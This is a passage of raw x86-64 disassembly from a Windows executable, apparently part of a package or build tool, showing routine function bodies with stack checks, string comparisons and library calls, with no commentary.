   1400034c4:	0f 8d 21 01 00 00    	jge    0x1400035eb
   1400034ca:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400034d1:	00 
   1400034d2:	e8 79 10 00 00       	call   0x140004550
   1400034d7:	83 f8 01             	cmp    $0x1,%eax
   1400034da:	75 3e                	jne    0x14000351a
   1400034dc:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   1400034e3:	48 85 c9             	test   %rcx,%rcx
   1400034e6:	74 11                	je     0x1400034f9
   1400034e8:	48 8b d6             	mov    %rsi,%rdx
   1400034eb:	e8 20 3c 00 00       	call   0x140007110
   1400034f0:	83 f8 01             	cmp    $0x1,%eax
   1400034f3:	0f 84 b3 00 00 00    	je     0x1400035ac
   1400034f9:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   140003500:	00 
   140003501:	48 8d 0d a0 88 02 00 	lea    0x288a0(%rip),%rcx        # 0x14002bda8
   140003508:	44 38 b5 31 30 00 00 	cmp    %r14b,0x3031(%rbp)
   14000350f:	0f 85 b4 00 00 00    	jne    0x1400035c9
   140003515:	e8 36 f5 ff ff       	call   0x140002a50
   14000351a:	4c 8b c6             	mov    %rsi,%r8
   14000351d:	48 8d 95 22 20 00 00 	lea    0x2022(%rbp),%rdx
   140003524:	48 8b cd             	mov    %rbp,%rcx
   140003527:	e8 e4 48 00 00       	call   0x140007e10
   14000352c:	85 c0                	test   %eax,%eax
   14000352e:	0f 88 ae 00 00 00    	js     0x1400035e2
   140003534:	80 7f 11 64          	cmpb   $0x64,0x11(%rdi)
   140003538:	75 59                	jne    0x140003593
   14000353a:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   140003541:	00 
   140003542:	48 8b cd             	mov    %rbp,%rcx
   140003545:	4c 8d 8c 24 d0 10 00 	lea    0x10d0(%rsp),%r9
   14000354c:	00 
   14000354d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003552:	4c 8d 84 24 d0 20 00 	lea    0x20d0(%rsp),%r8
   140003559:	00 
   14000355a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000355f:	e8 1c 0c 00 00       	call   0x140004180
   140003564:	eb 40                	jmp    0x1400035a6
   140003566:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   14000356a:	48 8d 94 24 d0 10 00 	lea    0x10d0(%rsp),%rdx
   140003571:	00 
   140003572:	48 8d 8c 24 d0 20 00 	lea    0x20d0(%rsp),%rcx
   140003579:	00 
   14000357a:	e8 c1 0e 00 00       	call   0x140004440
   14000357f:	41 3b c4             	cmp    %r12d,%eax
   140003582:	48 8d b4 24 d0 10 00 	lea    0x10d0(%rsp),%rsi
   140003589:	00 
   14000358a:	41 0f 44 dc          	cmove  %r12d,%ebx
   14000358e:	e9 e3 fe ff ff       	jmp    0x140003476
   140003593:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   14000359a:	00 
   14000359b:	48 8b d7             	mov    %rdi,%rdx
   14000359e:	49 8b cd             	mov    %r13,%rcx
   1400035a1:	e8 5a e0 ff ff       	call   0x140001600
   1400035a6:	8b d8                	mov    %eax,%ebx
   1400035a8:	85 c0                	test   %eax,%eax
   1400035aa:	75 24                	jne    0x1400035d0
   1400035ac:	48 8b d7             	mov    %rdi,%rdx
   1400035af:	49 8b cd             	mov    %r13,%rcx
   1400035b2:	e8 89 e3 ff ff       	call   0x140001940
   1400035b7:	48 8b f8             	mov    %rax,%rdi
   1400035ba:	49 3b 85 10 10 00 00 	cmp    0x1010(%r13),%rax
   1400035c1:	0f 82 89 fe ff ff    	jb     0x140003450
   1400035c7:	eb 31                	jmp    0x1400035fa
   1400035c9:	e8 42 f1 ff ff       	call   0x140002710
   1400035ce:	eb 27                	jmp    0x1400035f7
   1400035d0:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400035d4:	48 8d 0d 25 88 02 00 	lea    0x28825(%rip),%rcx        # 0x14002be00
   1400035db:	e8 30 f1 ff ff       	call   0x140002710
   1400035e0:	eb 18                	jmp    0x1400035fa
   1400035e2:	48 8d 0d e7 87 02 00 	lea    0x287e7(%rip),%rcx        # 0x14002bdd0
   1400035e9:	eb 07                	jmp    0x1400035f2
   1400035eb:	48 8d 0d 7e 87 02 00 	lea    0x2877e(%rip),%rcx        # 0x14002bd70
   1400035f2:	e8 19 f1 ff ff       	call   0x140002710
   1400035f7:	41 8b dc             	mov    %r12d,%ebx
   1400035fa:	48 8b b4 24 20 31 00 	mov    0x3120(%rsp),%rsi
   140003601:	00 
   140003602:	4c 8b bc 24 e0 30 00 	mov    0x30e0(%rsp),%r15
   140003609:	00 
   14000360a:	4c 8b a4 24 f0 30 00 	mov    0x30f0(%rsp),%r12
   140003611:	00 
   140003612:	4c 8b ac 24 e8 30 00 	mov    0x30e8(%rsp),%r13
   140003619:	00 
   14000361a:	48 8b bc 24 28 31 00 	mov    0x3128(%rsp),%rdi
   140003621:	00 
   140003622:	48 8b ac 24 18 31 00 	mov    0x3118(%rsp),%rbp
   140003629:	00 
   14000362a:	4c 39 74 24 30       	cmp    %r14,0x30(%rsp)
   14000362f:	74 21                	je     0x140003652
   140003631:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003636:	48 8b c8             	mov    %rax,%rcx
   140003639:	e8 c2 e2 ff ff       	call   0x140001900
   14000363e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003643:	4d 8d 76 01          	lea    0x1(%r14),%r14
   140003647:	4a 83 3c f0 00       	cmpq   $0x0,(%rax,%r14,8)
   14000364c:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003650:	75 e4                	jne    0x140003636
   140003652:	8b c3                	mov    %ebx,%eax
   140003654:	48 8b 8c 24 d0 30 00 	mov    0x30d0(%rsp),%rcx
   14000365b:	00 
   14000365c:	48 33 cc             	xor    %rsp,%rcx
   14000365f:	e8 5c 8f 00 00       	call   0x14000c5c0
   140003664:	48 81 c4 f8 30 00 00 	add    $0x30f8,%rsp
   14000366b:	41 5e                	pop    %r14
   14000366d:	5b                   	pop    %rbx
   14000366e:	c3                   	ret
   14000366f:	cc                   	int3
   140003670:	40 53                	rex push %rbx
   140003672:	48 83 ec 20          	sub    $0x20,%rsp
   140003676:	48 8b d9             	mov    %rcx,%rbx
   140003679:	e8 82 29 00 00       	call   0x140006000
   14000367e:	48 8b 8b 28 30 00 00 	mov    0x3028(%rbx),%rcx
   140003685:	48 85 c9             	test   %rcx,%rcx
   140003688:	74 10                	je     0x14000369a
   14000368a:	e8 c1 59 00 00       	call   0x140009050
   14000368f:	48 c7 83 28 30 00 00 	movq   $0x0,0x3028(%rbx)
   140003696:	00 00 00 00 
   14000369a:	48 83 c4 20          	add    $0x20,%rsp
   14000369e:	5b                   	pop    %rbx
   14000369f:	c3                   	ret
   1400036a0:	c2 00 00             	ret    $0x0
   1400036a3:	cc                   	int3
   1400036a4:	cc                   	int3
   1400036a5:	cc                   	int3
   1400036a6:	cc                   	int3
   1400036a7:	cc                   	int3
   1400036a8:	cc                   	int3
   1400036a9:	cc                   	int3
   1400036aa:	cc                   	int3
   1400036ab:	cc                   	int3
   1400036ac:	cc                   	int3
   1400036ad:	cc                   	int3
   1400036ae:	cc                   	int3
   1400036af:	cc                   	int3
   1400036b0:	40 53                	rex push %rbx
   1400036b2:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400036b7:	e8 04 92 00 00       	call   0x14000c8c0
   1400036bc:	48 2b e0             	sub    %rax,%rsp
   1400036bf:	48 8b 05 7a a9 03 00 	mov    0x3a97a(%rip),%rax        # 0x14003e040
   1400036c6:	48 33 c4             	xor    %rsp,%rax
   1400036c9:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   1400036d0:	00 
   1400036d1:	48 8b d9             	mov    %rcx,%rbx
   1400036d4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400036d9:	33 c9                	xor    %ecx,%ecx
   1400036db:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400036e1:	ff 15 f1 79 02 00    	call   *0x279f1(%rip)        # 0x14002b0d8
   1400036e7:	85 c0                	test   %eax,%eax
   1400036e9:	75 25                	jne    0x140003710
   1400036eb:	ff 15 df 79 02 00    	call   *0x279df(%rip)        # 0x14002b0d0
   1400036f1:	8b d0                	mov    %eax,%edx
   1400036f3:	4c 8d 05 36 8c 02 00 	lea    0x28c36(%rip),%r8        # 0x14002c330
   1400036fa:	48 8d 0d 77 8c 02 00 	lea    0x28c77(%rip),%rcx        # 0x14002c378
   140003701:	e8 4a f5 ff ff       	call   0x140002c50
   140003706:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000370b:	e9 95 00 00 00       	jmp    0x1400037a5
   140003710:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003715:	e8 d6 5b 00 00       	call   0x1400092f0
   14000371a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000371f:	85 c0                	test   %eax,%eax
   140003721:	74 5a                	je     0x14000377d
   140003723:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   14000372a:	00 
   14000372b:	e8 40 5c 00 00       	call   0x140009370
   140003730:	85 c0                	test   %eax,%eax
   140003732:	79 18                	jns    0x14000374c
   140003734:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003739:	48 8d 0d 60 8c 02 00 	lea    0x28c60(%rip),%rcx        # 0x14002c3a0
   140003740:	e8 cb f0 ff ff       	call   0x140002810
   140003745:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000374a:	eb 59                	jmp    0x1400037a5
   14000374c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003752:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   140003759:	00 
   14000375a:	48 8d 0d 9f 8c 02 00 	lea    0x28c9f(%rip),%rcx        # 0x14002c400
   140003761:	e8 12 1b 01 00       	call   0x140015278
   140003766:	33 d2                	xor    %edx,%edx
   140003768:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000376d:	85 c0                	test   %eax,%eax
   14000376f:	48 8d 84 24 20 20 00 	lea    0x2020(%rsp),%rax
   140003776:	00 
   140003777:	0f 45 ca             	cmovne %edx,%ecx
   14000377a:	48 03 c8             	add    %rax,%rcx
   14000377d:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003783:	48 8b d3             	mov    %rbx,%rdx
   140003786:	e8 25 5d 00 00       	call   0x1400094b0
   14000378b:	48 85 c0             	test   %rax,%rax
   14000378e:	75 13                	jne    0x1400037a3
   140003790:	48 8d 0d 79 8c 02 00 	lea    0x28c79(%rip),%rcx        # 0x14002c410
   140003797:	e8 74 f0 ff ff       	call   0x140002810
   14000379c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400037a1:	eb 02                	jmp    0x1400037a5
   1400037a3:	33 c0                	xor    %eax,%eax
   1400037a5:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400037ac:	00 
   1400037ad:	48 33 cc             	xor    %rsp,%rcx
   1400037b0:	e8 0b 8e 00 00       	call   0x14000c5c0
   1400037b5:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400037bc:	5b                   	pop    %rbx
   1400037bd:	c3                   	ret
   1400037be:	cc                   	int3
   1400037bf:	cc                   	int3
   1400037c0:	40 55                	rex push %rbp
   1400037c2:	57                   	push   %rdi
   1400037c3:	41 54                	push   %r12
   1400037c5:	b8 80 20 00 00       	mov    $0x2080,%eax
   1400037ca:	e8 f1 90 00 00       	call   0x14000c8c0
   1400037cf:	48 2b e0             	sub    %rax,%rsp
   1400037d2:	48 8b 05 67 a8 03 00 	mov    0x3a867(%rip),%rax        # 0x14003e040
   1400037d9:	48 33 c4             	xor    %rsp,%rax
   1400037dc:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   1400037e3:	00 
   1400037e4:	48 8b f9             	mov    %rcx,%rdi
   1400037e7:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400037ec:	e8 6f 1c 01 00       	call   0x140015460
   1400037f1:	48 8b c8             	mov    %rax,%rcx
   1400037f4:	33 d2                	xor    %edx,%edx
   1400037f6:	e8 f9 1c 01 00       	call   0x1400154f4
   1400037fb:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1400037ff:	e8 ac fe ff ff       	call   0x1400036b0
   140003804:	85 c0                	test   %eax,%eax
   140003806:	79 0c                	jns    0x140003814
   140003808:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   14000380f:	e9 83 04 00 00       	jmp    0x140003c97
   140003814:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003818:	48 89 9c 24 a8 20 00 	mov    %rbx,0x20a8(%rsp)
   14000381f:	00 
   140003820:	e8 2b e1 ff ff       	call   0x140001950
   140003825:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   14000382c:	48 c7 c5 ff ff ff ff 	mov    $0xffffffffffffffff,%rbp
   140003833:	48 85 c0             	test   %rax,%rax
   140003836:	0f 84 df 00 00 00    	je     0x14000391b
   14000383c:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   140003843:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003848:	48 8b cb             	mov    %rbx,%rcx
   14000384b:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   14000384f:	4c 8d 05 26 82 02 00 	lea    0x28226(%rip),%r8        # 0x14002ba7c
   140003856:	e8 25 e4 ff ff       	call   0x140001c80
   14000385b:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003862:	48 89 b4 24 b0 20 00 	mov    %rsi,0x20b0(%rsp)
   140003869:	00 
   14000386a:	40 32 f6             	xor    %sil,%sil
   14000386d:	4c 89 b4 24 78 20 00 	mov    %r14,0x2078(%rsp)
   140003874:	00 
   140003875:	0f b6 88 18 10 00 00 	movzbl 0x1018(%rax),%ecx
   14000387c:	88 8f 20 20 00 00    	mov    %cl,0x2020(%rdi)
   140003882:	48 8d 0d ff 86 02 00 	lea    0x286ff(%rip),%rcx        # 0x14002bf88
   140003889:	e8 92 51 00 00       	call   0x140008a20
   14000388e:	4c 8b f0             	mov    %rax,%r14
   140003891:	b9 31 00 00 00       	mov    $0x31,%ecx
   140003896:	33 c0                	xor    %eax,%eax
   140003898:	4d 85 f6             	test   %r14,%r14
   14000389b:	74 24                	je     0x1400038c1
   14000389d:	41 0f b6 36          	movzbl (%r14),%esi
   1400038a1:	2b f1                	sub    %ecx,%esi
   1400038a3:	75 0a                	jne    0x1400038af
   1400038a5:	41 0f b6 76 01       	movzbl 0x1(%r14),%esi
   1400038aa:	0f b6 c0             	movzbl %al,%eax
   1400038ad:	2b f0                	sub    %eax,%esi
   1400038af:	48 8d 0d d2 86 02 00 	lea    0x286d2(%rip),%rcx        # 0x14002bf88
   1400038b6:	e8 d5 52 00 00       	call   0x140008b90
   1400038bb:	85 f6                	test   %esi,%esi
   1400038bd:	40 0f 94 c6          	sete   %sil
   1400038c1:	49 8b ce             	mov    %r14,%rcx
   1400038c4:	e8 d7 16 01 00       	call   0x140014fa0
   1400038c9:	40 84 f6             	test   %sil,%sil
   1400038cc:	0f 85 2a 01 00 00    	jne    0x1400039fc
   1400038d2:	48 8d 0d d7 86 02 00 	lea    0x286d7(%rip),%rcx        # 0x14002bfb0
   1400038d9:	e8 42 51 00 00       	call   0x140008a20
   1400038de:	48 85 c0             	test   %rax,%rax
   1400038e1:	0f 84 0d 01 00 00    	je     0x1400039f4
   1400038e7:	4c 8b c8             	mov    %rax,%r9
   1400038ea:	48 8b cb             	mov    %rbx,%rcx
   1400038ed:	4c 2b cb             	sub    %rbx,%r9
   1400038f0:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400038f4:	42 0f b6 14 09       	movzbl (%rcx,%r9,1),%edx
   1400038f9:	44 2b c2             	sub    %edx,%r8d
   1400038fc:	75 07                	jne    0x140003905
   1400038fe:	48 ff c1             	inc    %rcx
   140003901:	85 d2                	test   %edx,%edx
   140003903:	75 eb                	jne    0x1400038f0
   140003905:	45 85 c0             	test   %r8d,%r8d
   140003908:	0f 85 e6 00 00 00    	jne    0x1400039f4
   14000390e:	48 8b c8             	mov    %rax,%rcx
   140003911:	e8 8a 16 01 00       	call   0x140014fa0
   140003916:	e9 14 01 00 00       	jmp    0x140003a2f
   14000391b:	48 8d 15 a2 7f 02 00 	lea    0x27fa2(%rip),%rdx        # 0x14002b8c4
   140003922:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003926:	e8 85 0c 00 00       	call   0x1400045b0
   14000392b:	48 8b d8             	mov    %rax,%rbx
   14000392e:	48 85 c0             	test   %rax,%rax
   140003931:	74 37                	je     0x14000396a
   140003933:	48 8b 0d fe 9b 02 00 	mov    0x29bfe(%rip),%rcx        # 0x14002d538
   14000393a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000393f:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140003944:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000394a:	48 c1 e9 18          	shr    $0x18,%rcx
   14000394e:	80 c1 0d             	add    $0xd,%cl
   140003951:	88 4c 24 53          	mov    %cl,0x53(%rsp)
   140003955:	48 8b c8             	mov    %rax,%rcx
   140003958:	e8 23 46 00 00       	call   0x140007f80
   14000395d:	48 85 c0             	test   %rax,%rax
   140003960:	75 22                	jne    0x140003984
   140003962:	48 8b cb             	mov    %rbx,%rcx
   140003965:	e8 52 c7 00 00       	call   0x1400100bc
   14000396a:	48 8d 5f 10          	lea    0x10(%rdi),%rbx
   14000396e:	48 8b d3             	mov    %rbx,%rdx
   140003971:	48 8d 0d f8 8a 02 00 	lea    0x28af8(%rip),%rcx        # 0x14002c470
   140003978:	e8 93 ed ff ff       	call   0x140002710
   14000397d:	8b c5                	mov    %ebp,%eax
   14000397f:	e9 0b 03 00 00       	jmp    0x140003c8f
   140003984:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   14000398b:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003990:	48 8b cb             	mov    %rbx,%rcx
   140003993:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   140003997:	4c 8d 05 de 80 02 00 	lea    0x280de(%rip),%r8        # 0x14002ba7c
   14000399e:	e8 dd e2 ff ff       	call   0x140001c80
   1400039a3:	48 8b c5             	mov    %rbp,%rax
   1400039a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400039ad:	00 00 00 
   1400039b0:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   1400039b5:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400039b9:	75 f5                	jne    0x1400039b0
   1400039bb:	48 8b cb             	mov    %rbx,%rcx
   1400039be:	c7 84 38 0d 10 00 00 	movl   $0x676b70,0x100d(%rax,%rdi,1)
   1400039c5:	70 6b 67 00 
   1400039c9:	e8 82 df ff ff       	call   0x140001950
   1400039ce:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   1400039d5:	48 85 c0             	test   %rax,%rax
   1400039d8:	0f 85 7d fe ff ff    	jne    0x14000385b
   1400039de:	48 8d 0d db 8a 02 00 	lea    0x28adb(%rip),%rcx        # 0x14002c4c0
   1400039e5:	48 8b d3             	mov    %rbx,%rdx
   1400039e8:	e8 23 ed ff ff       	call   0x140002710
   1400039ed:	8b c5                	mov    %ebp,%eax
   1400039ef:	e9 9b 02 00 00       	jmp    0x140003c8f
   1400039f4:	48 8b c8             	mov    %rax,%rcx
   1400039f7:	e8 a4 15 01 00       	call   0x140014fa0
   1400039fc:	48 8b d3             	mov    %rbx,%rdx
   1400039ff:	48 8d 0d aa 85 02 00 	lea    0x285aa(%rip),%rcx        # 0x14002bfb0
   140003a06:	e8 25 51 00 00       	call   0x140008b30
   140003a0b:	48 8d 0d b6 85 02 00 	lea    0x285b6(%rip),%rcx        # 0x14002bfc8
   140003a12:	e8 79 51 00 00       	call   0x140008b90
   140003a17:	48 8d 0d ca 85 02 00 	lea    0x285ca(%rip),%rcx        # 0x14002bfe8
   140003a1e:	e8 6d 51 00 00       	call   0x140008b90
   140003a23:	48 8d 0d de 85 02 00 	lea    0x285de(%rip),%rcx        # 0x14002c008
   140003a2a:	e8 61 51 00 00       	call   0x140008b90
   140003a2f:	48 8d 0d b2 85 02 00 	lea    0x285b2(%rip),%rcx        # 0x14002bfe8
   140003a36:	e8 e5 4f 00 00       	call   0x140008a20
   140003a3b:	48 85 c0             	test   %rax,%rax
   140003a3e:	0f 84 01 01 00 00    	je     0x140003b45
   140003a44:	80 38 00             	cmpb   $0x0,(%rax)
   140003a47:	0f 84 f8 00 00 00    	je     0x140003b45
   140003a4d:	80 38 30             	cmpb   $0x30,(%rax)
   140003a50:	0f 85 be 00 00 00    	jne    0x140003b14
   140003a56:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140003a5a:	0f 85 b4 00 00 00    	jne    0x140003b14
   140003a60:	4c 8d b7 21 20 00 00 	lea    0x2021(%rdi),%r14
   140003a67:	41 c6 06 01          	movb   $0x1,(%r14)
   140003a6b:	4c 89 ac 24 b8 20 00 	mov    %r13,0x20b8(%rsp)
   140003a72:	00 
   140003a73:	48 8b c8             	mov    %rax,%rcx
   140003a76:	4c 89 bc 24 70 20 00 	mov    %r15,0x2070(%rsp)
   140003a7d:	00 
   140003a7e:	e8 1d 15 01 00       	call   0x140014fa0
   140003a83:	41 0f b6 06          	movzbl (%r14),%eax
   140003a87:	4c 8d 2d 8a 85 02 00 	lea    0x2858a(%rip),%r13        # 0x14002c018
   140003a8e:	3c 02                	cmp    $0x2,%al
   140003a90:	73 19                	jae    0x140003aab
   140003a92:	84 c0                	test   %al,%al
   140003a94:	48 8d 15 0d 85 02 00 	lea    0x2850d(%rip),%rdx        # 0x14002bfa8
   140003a9b:	48 8d 0d 46 85 02 00 	lea    0x28546(%rip),%rcx        # 0x14002bfe8
   140003aa2:	49 0f 44 d5          	cmove  %r13,%rdx
   140003aa6:	e8 85 50 00 00       	call   0x140008b30
   140003aab:	4c 8b bf 10 20 00 00 	mov    0x2010(%rdi),%r15
   140003ab2:	49 8b 9f 08 10 00 00 	mov    0x1008(%r15),%rbx
   140003ab9:	49 3b 9f 10 10 00 00 	cmp    0x1010(%r15),%rbx
   140003ac0:	0f 83 22 01 00 00    	jae    0x140003be8
   140003ac6:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140003aca:	0f 85 fd 00 00 00    	jne    0x140003bcd
   140003ad0:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003ad6:	48 8d 15 bb 86 02 00 	lea    0x286bb(%rip),%rdx        # 0x14002c198
   140003add:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003ae1:	e8 da 17 01 00       	call   0x1400152c0
   140003ae6:	85 c0                	test   %eax,%eax
   140003ae8:	75 78                	jne    0x140003b62
   140003aea:	48 8d 4b 22          	lea    0x22(%rbx),%rcx
   140003aee:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003af4:	48 8d 15 ad 86 02 00 	lea    0x286ad(%rip),%rdx        # 0x14002c1a8
   140003afb:	e8 c0 17 01 00       	call   0x1400152c0
   140003b00:	85 c0                	test   %eax,%eax
   140003b02:	0f 85 c5 00 00 00    	jne    0x140003bcd
   140003b08:	c6 87 79 30 00 00 01 	movb   $0x1,0x3079(%rdi)
   140003b0f:	e9 b9 00 00 00       	jmp    0x140003bcd
   140003b14:	80 38 31             	cmpb   $0x31,(%rax)
   140003b17:	75 16                	jne    0x140003b2f
   140003b19:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140003b1d:	75 10                	jne    0x140003b2f
   140003b1f:	4c 8d b7 21 20 00 00 	lea    0x2021(%rdi),%r14
   140003b26:	41 c6 06 02          	movb   $0x2,(%r14)
   140003b2a:	e9 3c ff ff ff       	jmp    0x140003a6b
   140003b2f:	48 8b d0             	mov    %rax,%rdx
   140003b32:	48 8d 0d e7 84 02 00 	lea    0x284e7(%rip),%rcx        # 0x14002c020
   140003b39:	e8 d2 eb ff ff       	call   0x140002710
   140003b3e:	8b c5                	mov    %ebp,%eax
   140003b40:	e9 3a 01 00 00       	jmp    0x140003c7f
   140003b45:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003b4c:	4c 8d b7 21 20 00 00 	lea    0x2021(%rdi),%r14
   140003b53:	0f 84 0e ff ff ff    	je     0x140003a67
   140003b59:	41 c6 06 00          	movb   $0x0,(%r14)
   140003b5d:	e9 09 ff ff ff       	jmp    0x140003a6b
   140003b62:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   140003b68:	48 8d 15 49 86 02 00 	lea    0x28649(%rip),%rdx        # 0x14002c1b8
   140003b6f:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003b73:	e8 48 17 01 00       	call   0x1400152c0
   140003b78:	85 c0                	test   %eax,%eax
   140003b7a:	75 0b                	jne    0x140003b87
   140003b7c:	48 8d 43 25          	lea    0x25(%rbx),%rax
   140003b80:	48 89 87 68 30 00 00 	mov    %rax,0x3068(%rdi)
   140003b87:	41 b8 16 00 00 00    	mov    $0x16,%r8d
   140003b8d:	48 8d 15 3c 86 02 00 	lea    0x2863c(%rip),%rdx        # 0x14002c1d0
   140003b94:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003b98:	e8 23 17 01 00       	call   0x1400152c0
   140003b9d:	85 c0                	test   %eax,%eax
   140003b9f:	75 0b                	jne    0x140003bac
   140003ba1:	48 8d 43 29          	lea    0x29(%rbx),%rax
   140003ba5:	48 89 87 70 30 00 00 	mov    %rax,0x3070(%rdi)
   140003bac:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140003bb2:	48 8d 15 2f 86 02 00 	lea    0x2862f(%rip),%rdx        # 0x14002c1e8
   140003bb9:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003bbd:	e8 fe 16 01 00       	call   0x1400152c0
   140003bc2:	85 c0                	test   %eax,%eax
   140003bc4:	75 07                	jne    0x140003bcd
   140003bc6:	c6 87 78 30 00 00 01 	movb   $0x1,0x3078(%rdi)
   140003bcd:	48 8b d3             	mov    %rbx,%rdx
   140003bd0:	49 8b cf             	mov    %r15,%rcx
   140003bd3:	e8 68 dd ff ff       	call   0x140001940
   140003bd8:	48 8b d8             	mov    %rax,%rbx
   140003bdb:	49 3b 87 10 10 00 00 	cmp    0x1010(%r15),%rax
   140003be2:	0f 82 de fe ff ff    	jb     0x140003ac6
   140003be8:	48 8d 0d 61 84 02 00 	lea    0x28461(%rip),%rcx        # 0x14002c050
   140003bef:	e8 2c 4e 00 00       	call   0x140008a20
   140003bf4:	4c 8b c0             	mov    %rax,%r8
   140003bf7:	48 85 c0             	test   %rax,%rax
   140003bfa:	74 32                	je     0x140003c2e
   140003bfc:	0f b6 10             	movzbl (%rax),%edx
   140003bff:	83 ea 30             	sub    $0x30,%edx
   140003c02:	75 1a                	jne    0x140003c1e
   140003c04:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003c08:	45 33 ff             	xor    %r15d,%r15d
   140003c0b:	41 0f b6 cf          	movzbl %r15b,%ecx
   140003c0f:	2b d1                	sub    %ecx,%edx
   140003c11:	85 d2                	test   %edx,%edx
   140003c13:	0f 95 c0             	setne  %al
   140003c16:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003c1c:	eb 13                	jmp    0x140003c31
   140003c1e:	45 33 ff             	xor    %r15d,%r15d
   140003c21:	85 d2                	test   %edx,%edx
   140003c23:	0f 95 c0             	setne  %al
   140003c26:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003c2c:	eb 03                	jmp    0x140003c31
   140003c2e:	45 33 ff             	xor    %r15d,%r15d
   140003c31:	49 8b c8             	mov    %r8,%rcx
   140003c34:	e8 67 13 01 00       	call   0x140014fa0
   140003c39:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003c40:	0f 84 fb 00 00 00    	je     0x140003d41
   140003c46:	41 80 3e 00          	cmpb   $0x0,(%r14)
   140003c4a:	0f 85 84 00 00 00    	jne    0x140003cd4
   140003c50:	e8 8b 54 00 00       	call   0x1400090e0
   140003c55:	48 89 87 38 30 00 00 	mov    %rax,0x3038(%rdi)
   140003c5c:	48 85 c0             	test   %rax,%rax
   140003c5f:	75 52                	jne    0x140003cb3
   140003c61:	48 8d 0d 08 84 02 00 	lea    0x28408(%rip),%rcx        # 0x14002c070
   140003c68:	e8 a3 ea ff ff       	call   0x140002710
   140003c6d:	8b c5                	mov    %ebp,%eax
   140003c6f:	4c 8b ac 24 b8 20 00 	mov    0x20b8(%rsp),%r13
   140003c76:	00 
   140003c77:	4c 8b bc 24 70 20 00 	mov    0x2070(%rsp),%r15
   140003c7e:	00 
   140003c7f:	48 8b b4 24 b0 20 00 	mov    0x20b0(%rsp),%rsi
   140003c86:	00 
   140003c87:	4c 8b b4 24 78 20 00 	mov    0x2078(%rsp),%r14
   140003c8e:	00 
   140003c8f:	48 8b 9c 24 a8 20 00 	mov    0x20a8(%rsp),%rbx
   140003c96:	00 
   140003c97:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140003c9e:	00 
   140003c9f:	48 33 cc             	xor    %rsp,%rcx
   140003ca2:	e8 19 89 00 00       	call   0x14000c5c0
   140003ca7:	48 81 c4 80 20 00 00 	add    $0x2080,%rsp
   140003cae:	41 5c                	pop    %r12
   140003cb0:	5f                   	pop    %rdi
   140003cb1:	5d                   	pop    %rbp
   140003cb2:	c3                   	ret
